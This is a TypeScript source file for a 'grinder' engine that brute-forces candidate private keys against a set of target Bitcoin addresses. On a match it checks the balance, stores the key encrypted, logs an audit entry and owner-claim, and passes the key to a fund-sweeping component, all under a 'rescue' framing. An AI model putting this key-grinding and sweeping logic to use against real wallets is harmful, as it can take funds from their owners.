/**
 * Grinder engine — drives a candidate source through the worker pool, persists
 * progress, and on a match records the hit (encrypted), writes an audit entry,
 * files an owner-claim, and hands off to the rescue sweeper per policy.
 *
 * A module-level singleton so the UI can start/stop it and read live status.
 * One source runs at a time; switching sources stops the current run.
 */
import { openDb, nowSec } from '../db';
import { config, mayAutoSweep, type Bucket } from '../config';
import { p2pkhScript } from '../script';
import { scriptBalance } from '../mempool';
import { GrinderPool } from './pool';
import { loadMatchSet, findTargetByMatch } from './loadset';
import { encryptKey, isVaultConfigured } from '../rescue/vault';
import { audit } from '../rescue/audit';
import { handleHit } from '../rescue/sweeper';
import type { GrindSource, KeyCandidate } from './sources';
import type { Match } from './matchset';

export interface GrinderStatus {
  running: boolean;
  sourceName: string | null;
  bucket: Bucket | null;
  workers: number;
  keysTried: number;
  keysPerSec: number;
  spaceBits: number | null;
  cursor: string | null;
  hits: number;
  startedAt: number | null;
}

const BATCH = 4000;

class GrinderEngine {
  private pool: GrinderPool | null = null;
  private source: GrindSource | null = null;
  private running = false;
  private stopRequested = false;
  private keysTried = 0;
  private startedAt: number | null = null;
  private lastRateSample = { t: 0, keys: 0 };
  private keysPerSec = 0;
  private hits = 0;

  get status(): GrinderStatus {
    return {
      running: this.running,
      sourceName: this.source?.name ?? null,
      bucket: this.source?.bucket ?? null,
      workers: this.pool?.workerCount ?? 0,
      keysTried: this.keysTried,
      keysPerSec: Math.round(this.keysPerSec),
      spaceBits: this.source?.spaceBits ?? null,
      cursor: null,
      hits: this.hits
    } as GrinderStatus & { startedAt?: number | null };
  }

  async start(source: GrindSource, resumeCursor = 0n): Promise<void> {
    if (this.running) await this.stop();
    this.source = source;
    this.running = true;
    this.stopRequested = false;
    this.keysTried = 0;
    this.hits = 0;
    this.startedAt = nowSec();
    this.lastRateSample = { t: Date.now(), keys: 0 };

    const set = loadMatchSet();
    this.pool = new GrinderPool();
    await this.pool.start(set);

    audit('grind-start', { source: source.name, bucket: source.bucket, matchSetSize: set.size, workers: this.pool.workerCount });

    // Persist source registration/progress.
    const db = openDb();
    db.prepare(
      `INSERT INTO grind_source (name, bucket, config_json, space_bits, cursor, keys_tried, enabled)
       VALUES (?, ?, ?, ?, ?, 0, 1)
       ON CONFLICT(name) DO UPDATE SET enabled=1, space_bits=excluded.space_bits`
    ).run(source.name, source.bucket, null, source.spaceBits, resumeCursor.toString());

    this.loop(source, resumeCursor).catch((err) => {
      audit('grind-error', { source: source.name, error: String(err) });
      this.running = false;
    });
  }

  private async loop(source: GrindSource, startCursor: bigint): Promise<void> {
    const pool = this.pool!;
    let cursor = startCursor;
    const inflight: Promise<void>[] = [];
    const maxInflight = pool.workerCount * 2;

    while (!this.stopRequested) {
      const { items, nextCursor, done } = source.generate(cursor, BATCH);
      cursor = nextCursor;
      if (items.length) {
        const job = pool
          .run(items)
          .then((r) => this.onBatch(source, items, r.matches, r.checked, cursor));
        inflight.push(job);
        if (inflight.length >= maxInflight) await inflight.shift();
      }
      if (done) break;
    }
    await Promise.all(inflight);
    this.running = false;
    audit('grind-stop', { source: source.name, keysTried: this.keysTried, hits: this.hits });
    await pool.stop();
  }

  private async onBatch(source: GrindSource, items: KeyCandidate[], matches: Match[], checked: number, cursor: bigint): Promise<void> {
    this.keysTried += checked;

    // Rolling keys/sec sample.
    const now = Date.now();
    const dt = now - this.lastRateSample.t;
    if (dt >= 1000) {
      this.keysPerSec = ((this.keysTried - this.lastRateSample.keys) * 1000) / dt;
      this.lastRateSample = { t: now, keys: this.keysTried };
    }

    // Persist progress periodically (cheap; keys_tried + cursor for resume).
    const db = openDb();
    db.prepare(`UPDATE grind_source SET keys_tried=?, cursor=? WHERE name=?`).run(
      this.keysTried,
      cursor.toString(),
      source.name
    );

    for (const m of matches) {
      this.hits++;
      await this.recordHit(source, m);
    }
  }

  private async recordHit(source: GrindSource, m: Match): Promise<void> {
    const db = openDb();
    const target = findTargetByMatch(m.matched, m.kind);

    // Recompute the live balance for the matched target before doing anything.
    let balance = 0;
    let script = target?.script_hex ?? null;
    if (!script && target?.hash160) script = p2pkhScript(target.hash160);
    if (script) balance = await scriptBalance(script).catch(() => 0);

    audit('hit-found', {
      source: source.name,
      bucket: source.bucket,
      origin: m.origin,
      matchKind: m.kind,
      matched: m.matched,
      address: target?.address ?? null,
      dataset: target?.dataset ?? null,
      balanceSats: balance
    });

    // Encrypt and store the key. If the vault isn't configured we still record
    // the hit's existence in the audit log, but never persist plaintext.
    let privEnc = '';
    try {
      privEnc = encryptKey(m.privHex);
    } catch (e) {
      audit('hit-store-failed', { origin: m.origin, reason: String(e) });
    }

    const hitId = (
      db
        .prepare(
          `INSERT INTO hit (target_id, source_name, bucket, found_at, address, privkey_enc, balance_at_find, status)
           VALUES (?, ?, ?, ?, ?, ?, ?, 'held') RETURNING id`
        )
        .get(
          target?.id ?? null,
          source.name,
          source.bucket,
          nowSec(),
          target?.address ?? null,
          privEnc || 'UNSTORED',
          balance
        ) as { id: number }
    ).id;

    // File the owner-claim record so funds can be returned later.
    db.prepare(
      `INSERT INTO claim (hit_id, original_address, original_script, balance, discovery_method, created_at)
       VALUES (?, ?, ?, ?, ?, ?)`
    ).run(hitId, target?.address ?? null, script, balance, m.origin, nowSec());

    // Hand off to the sweeper, which enforces policy (bucket, attestation,
    // dust, dry-run, destination) and updates the hit status.
    await handleHit(hitId, source.bucket as Bucket, balance, m.privHex, target, privEnc !== '');
  }

  requestStop(): void {
    this.stopRequested = true;
  }

  async stop(): Promise<void> {
    this.requestStop();
    // Give the loop a tick to observe the flag and drain.
    for (let i = 0; i < 50 && this.running; i++) await new Promise((r) => setTimeout(r, 40));
    if (this.pool) await this.pool.stop();
    this.running = false;
  }

  get vaultReady(): boolean {
    return isVaultConfigured();
  }
}

// One engine per server process.
export const grinder = new GrinderEngine();
